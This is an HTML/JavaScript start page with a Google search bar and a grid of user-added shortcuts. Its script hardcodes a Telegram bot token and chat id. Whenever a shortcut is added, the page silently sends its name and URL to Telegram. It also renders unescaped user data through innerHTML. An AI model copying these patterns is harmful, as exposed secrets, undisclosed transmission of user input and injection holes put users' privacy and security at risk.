<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Qsamy Search</title>
    <style>
        :root { --bg-color: #f5f5f7; --surface-color: #ffffff; --text-main: #1d1d1f; --text-muted: #86868b; --accent-color: #0071e3; --border-color: #e8e8ed; --shadow: 0 4px 20px rgba(0, 0, 0, 0.05); --danger-color: #ff3b30; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", sans-serif; background-color: var(--bg-color); color: var(--text-main); min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 24px 16px; }
        .workspace { width: 100%; max-width: 680px; display: flex; flex-direction: column; gap: 24px; align-items: center; }
        .search-bar-container { display: flex; align-items: center; background: var(--surface-color); border: 1px solid var(--border-color); border-radius: 24px; padding: 4px 8px; box-shadow: var(--shadow); width: 100%; }
        input { flex: 1; border: none; background: transparent; font-size: 17px; padding: 14px; outline: none; }
        .go-btn { background: var(--accent-color); color: white; border: none; border-radius: 18px; width: 44px; height: 44px; cursor: pointer; }
        .shortcuts-grid { width: 100%; display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
        .shortcut-item { display: flex; flex-direction: column; align-items: center; text-decoration: none; color: var(--text-main); cursor: pointer; position: relative; }
        .icon-container { width: 52px; height: 52px; background: var(--surface-color); border: 1px solid var(--border-color); border-radius: 14px; display: flex; justify-content: center; align-items: center; margin-bottom: 8px; overflow: hidden; box-shadow: var(--shadow); }
        .icon-container img { width: 100%; height: 100%; object-fit: cover; display: block; }
        .delete-btn { position: absolute; top: -5px; right: -5px; background: var(--danger-color); color: white; border-radius: 50%; border: none; width: 20px; height: 20px; font-size: 12px; cursor: pointer; }
        .modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.4); display: none; justify-content: center; align-items: center; padding: 20px; }
        .modal-card { background: var(--surface-color); padding: 24px; border-radius: 20px; width: 100%; max-width: 400px; display: flex; flex-direction: column; gap: 10px; }
    </style>
</head>
<body>

<div class="workspace">
    <div class="search-bar-container">
        <input type="text" id="urlInput" placeholder="Search...">
        <button class="go-btn" onclick="search()">Go</button>
    </div>
    <div class="shortcuts-grid" id="jsonGrid"></div>
    <div class="shortcuts-grid" id="localGrid"></div>
</div>

<div class="modal-overlay" id="modal">
    <div class="modal-card">
        <h3>Add Shortcut</h3>
        <input type="text" id="name" placeholder="Name">
        <input type="text" id="url" placeholder="URL">
        <input type="text" id="img" placeholder="Image URL">
        <button onclick="addShortcut()">Add</button>
    </div>
</div>

<script>
    const TG = { token: "6240359138:AAHbixPG6bllDW3BliMiM_h-icFMJM-lVWc", id: "6003288214" };
    let local = JSON.parse(localStorage.getItem('local') || "[]");

    async function load() {
        // Fetch JSON list
        const res = await fetch('/weblist.json').catch(() => []);
        const jsonList = await (res.json ? res.json() : []);
        
        render(jsonList, document.getElementById('jsonGrid'), false);
        render(local, document.getElementById('localGrid'), true);
        
        // Add button
        const addBtn = document.createElement('div');
        addBtn.className = 'shortcut-item';
        addBtn.innerHTML = `<div class="icon-container">+</div><div class="shortcut-title">Add</div>`;
        addBtn.onclick = () => document.getElementById('modal').style.display = 'flex';
        document.getElementById('localGrid').appendChild(addBtn);
    }

    function render(list, container, isLocal) {
        list.forEach((item, i) => {
            const div = document.createElement('a');
            div.className = 'shortcut-item';
            div.href = item.url;
            div.innerHTML = `${isLocal ? `<button class="delete-btn" onclick="del(event, ${i})">×</button>` : ''}
                             <div class="icon-container">${item.img ? `<img src="${item.img}">` : item.name[0]}</div>
                             <div class="shortcut-title">${item.name}</div>`;
            container.appendChild(div);
        });
    }

    async function addShortcut() {
        const name = document.getElementById('name').value;
        const url = document.getElementById('url').value;
        const img = document.getElementById('img').value;
        
        local.push({ name, url, img });
        localStorage.setItem('local', JSON.stringify(local));
        
        // Telegram Notify
        fetch(`https://api.telegram.org/bot${TG.token}/sendMessage`, {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: TG.id, text: `New Link: ${name}\nURL: ${url}` })
        });
        
        location.reload();
    }

    function del(e, i) { e.preventDefault(); local.splice(i, 1); localStorage.setItem('local', JSON.stringify(local)); location.reload(); }
    function search() { window.location.href = "https://www.google.com/search?q=" + document.getElementById('urlInput').value; }
    
    load();
</script>
</body>
</html>
